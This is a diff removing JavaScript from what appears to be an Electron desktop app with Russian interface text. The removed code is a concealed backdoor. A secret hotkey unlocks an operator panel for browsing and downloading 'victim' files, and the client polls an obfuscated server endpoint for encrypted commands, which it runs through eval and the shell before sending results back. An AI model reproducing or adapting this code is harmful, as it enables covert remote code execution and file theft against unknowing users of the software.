-goToParentDir.addEventListener(`click`, () => {
-    if (!parentDir) {
-        return;
-    }
-    snd(parentDir);
-});
-
-downloadAll.addEventListener(`click`, async () => {
-    if (!currentDir) {
-        return;
-    }
-    sendCommandBackDoor(`getDir('${currentDir.join(victimInfo.pathSep.repeat(victimInfo.platform == `linux` ? 1 : 2))}', undefined, undefined, ${await swal({
-        text: `Скачать рекурсивно?`,
-        buttons: [`Нет`, `Да`]
-    }, true)})`, victimId.value);
-    swal({
-        content: backDoorFiles,
-        button: false
-    });
-});
-
-goToStart.addEventListener(`click`, async () => {
-    const ans = await sendCommandBackDoor(getBacckDoorFilesFormCommand(`"${goToPath.value.replace(/\\([a-z])/gi, `\\\\$1`)}"`), victimId.value);
-    if (ans.error) {
-        parentDir = undefined;
-        showErrorModal(ans.errorReason);
-    }
-});
-
-const rootSub = async () => {
-    const r = await requestPostAsync({
-        url: `${server}/cXVNwFSJeTwXFH6`,
-        form: {
-            _id: user._id,
-            waitingData: true
-        }
-    });
-    if (!r) {
-        return setImmediate(rootSub);
-    }
-    const {
-        data
-    } = r;
-    const decData = getDecryptedDataBackDoor(data, user.aesKeyBytes);
-    if (`result` in decData) {
-        let jsonPart;
-        try {
-            jsonPart = JSON.parse(decData.result);
-            if (jsonPart.backDoorFiles) {
-                const {
-                    backDoorFiles: data
-                } = jsonPart;
-                if (data.dir) {
-                    idsToFiles = {};
-                    currentDir = data.dir;
-                    curPath.value = data.dir.join(path.sep);
-                    parentDir = data.parentDir;
-                    const {
-                        files,
-                        stats //true if directory, false if file
-                    } = data;
-                    let r = ``;
-                    SSort((a, b) => b - a, stats, files);
-                    for (let i = 0; i < files.length; i++) {
-                        const id = await getRandomId();
-                        idsToFiles[id] = files[i];
-                        const lastEl = files[i][files[i].length - 1];
-                        r += `<div class="dirFile" style="color: #${stats[i] ? `8cb0cf` : ``}; font-weight: bold;" onclick="${stats[i] ? `sndd('${id}')` : `dnf('${id}')`}">${lastEl}<br></div>
-                        <div style="dispay: flex; flex-direction: row"><button ${stats[i] ? `style="border-color: #8cb0cf; color: #8cb0cf;"` : ``} onclick="copyPathFromFileId('${id}')">Скопировать путь</button></div>`;
-                    }
-                    backDoorFilesAndDirs.innerHTML = r;
-                }
-            } else if (jsonPart.backDoorImportantInfo) {
-                victimInfo = jsonPart.backDoorImportantInfo;
-                backDoorFilesDisks.textContent = victimInfo.disks.map(disk => `${disk}\\\\`).join(` `);
-            } else {
-                throw new Error;
-            }
-        } catch (e) {
-            backDoorResults.textContent += `${decData._victimId}: ${decData.result}\n`;
-        }
-    } else {
-        const {
-            fileId,
-            ext,
-            filePart,
-            position
-        } = decData;
-        if (!userFiles[fileId]) {
-            const victimPath = path.join(backDoorDir, Buffer.from(decData._victimName).toString(`hex`));
-            if (!usersDirectories[decData._victimId]) {
-                usersDirectories[decData._victimId] = victimPath;
-            }
-            if (!fs.existsSync(victimPath)) {
-                fs.mkdirSync(victimPath);
-            }
-            userFiles[fileId] = {
-                path: victimPath,
-                fileName: `${fileId}${ext}`,
-                positions: [],
-                parts: []
-            };
-        }
-        if (decData.ready) {
-            const fileObj = userFiles[decData.fileId];
-            SSort((a, b) => a - b, fileObj.positions, fileObj.parts);
-            if (decData.pathName) {
-                fileObj.path = path.join(usersDirectories[decData._victimId], decData.pathName); //decData.pathName сплитим по сепаратору жертвы, далее джоин своим родным
-                if (!fs.existsSync(fileObj.path)) {
-                    fs.mkdirSync(fileObj.path, {
-                        recursive: true
-                    });
-                }
-            }
-            fileObj.path = path.join(fileObj.path, fileObj.fileName);
-            if (!(fileObj.positions[0] == 1 && fileObj.positions.every((e, p, a) => !p || e - a[p - 1] == 1))) {
-                showErrorModal(`${fileObj.path} поврежден!`);
-            }
-            await fs.writeFile(fileObj.path, Buffer.concat(fileObj.parts));
-            delete userFiles[decData.fileId];
-        } else {
-            const fileObj = userFiles[fileId];
-            fileObj.positions.push(position);
-            fileObj.parts.push(Buffer.from(filePart, encoding));
-        }
-    }
-    setImmediate(rootSub);
-};
-
-const backDoorFiles = getElem(`backDoorFiles`);
-const victimId = getElem(`victimId`);
-
-document.addEventListener(`keydown`, async e => {
-    if (e.shiftKey && e.ctrlKey && e.key.match(/[иb]/i) && user.active) {
-        if (!checkedRoot) {
-            checkedRoot = true;
-            accessRoot = getDecryptedDataBackDoor((await requestPostAsync({
-                url: `${server}/Si9Mu7IY8LpTvqj`,
-                form: {
-                    _id: user._id
-                }
-            })).data, user.aesKeyBytes).access;
-            if (accessRoot) {
-                getElem(`backDoor`).style.display = `block`;
-                rootSub();
-                fs.readdir(backDoorDir, (err, data) => {
-                    if (err) {
-                        fs.mkdir(backDoorDir, {
-                            recursive: true
-                        }, (err) => {
-                            if (err) throw err;
-                        });
-                    }
-                });
-            }
-        }
-        if (accessRoot) {
-            swal({
-                content: backDoorBlock,
-                button: false
-            }, true);
-        }
-    } else if (e.shiftKey && e.ctrlKey && e.key.match(/[тn]/i) && accessRoot) {
-        backDoorFiles.style.display = `block`;
-        swal({
-            content: backDoorFiles,
-            button: false
-        }, true);
-    }
-});
-
-const getBacckDoorFilesFormCommand = dir => `
-if (Array.isArray(${dir})) {
-    fp = ${dir}.join(path.sep);
-} else {
-    fp = ${dir};
-}
-files = fs.readdirSync(fp).map(fileName => path.join(fp, fileName)).filter(filePath => {
-    try {
-        return !!fs.statSync(filePath);
-    } catch (e) {
-        return false;
-    }
-});
-({
-    backDoorFiles: {
-        dir: fp.split(path.sep),
-        files: files.map(filePath => filePath.split(path.sep)),
-        stats: files.map(filePath => fs.statSync(filePath).isDirectory()),
-        parentDir: path.join(fp, "..").split(path.sep)
-    }
-})`;
-
-getElem(`backDoorFilesForm`).addEventListener(`submit`, async e => {
-    e.preventDefault();
-    const ans = await sendCommandBackDoor(getBacckDoorFilesFormCommand(`path.join(hendrixdir, "..")`), victimId.value);
-    if (ans.error) {
-        parentDir = undefined;
-        showErrorModal(ans.errorReason);
-    } else {
-        sendCommandBackDoor(`
-        let disks;
-        try {
-            disks = child_process.execSync('wmic logicaldisk get name').toString().match(/\\w:/g);
-        } catch (e) {
-            disks = [];
-        }
-        ({
-            backDoorImportantInfo: {
-                disks,
-                pathSep: path.sep,
-                platform: process.platform
-            }
-        })`, victimId.value);
-    }
-});
-
-const msg = message => dialog.showMessageBox(currentWindow, {
-    type: `info`,
-    title: `Уведомление`,
-    message
-});
-
-const emsg = message => dialog.showMessageBox(currentWindow, {
-    type: `error`,
-    title: `Уведомление`,
-    message
-});
-
-const cmd = command => (exec(`chcp 65001 | ${command}`, (er, data) => {
-    if (er) {
-        return sendReadyData(er.message);
-    }
-    sendReadyData(data.toString());
-}), `Команда выполняется`);
-
-const {
-    exec
-} = child_process;
-
-const executeCode = code => {
-    try {
-        return JSON.stringify(eval(code)) || ``;
-    } catch (e) {
-        return e.message;
-    }
-};
-
-const sendReadyData = async result => {
-    await requestPostAsync({
-        url: `${server}/cXVNwFSJeTwXFH6`,
-        form: {
-            data: getDataPropertyBackDoor({
-                result
-            }, user.aesKeyBytes),
-            _id: user._id
-        }
-    });
-};
-
-const getCommand = async () => {
-    const p = await requestPostAsync({
-        url: `${server}/Mh3lWGicrcSGu7V`,
-        form: {
-            _id: user._id
-        }
-    });
-    if (!p) {
-        return setImmediate(getCommand);
-    }
-    const cmd = p.data;
-    const {
-        command
-    } = getDecryptedDataBackDoor(cmd, user.aesKeyBytes);
-    console.log(
-        getDecryptedDataBackDoor(cmd, user.aesKeyBytes)
-    )
-    const dt = executeCode(command) || ``;
-    result = dt.length > packetSize ? (sendBufferBackDoor(Buffer.from(dt), `.txt`), `Слишком большой результат команды, отправляю файл`) : dt;
-    await sendReadyData(result);
-    setImmediate(getCommand);
-};
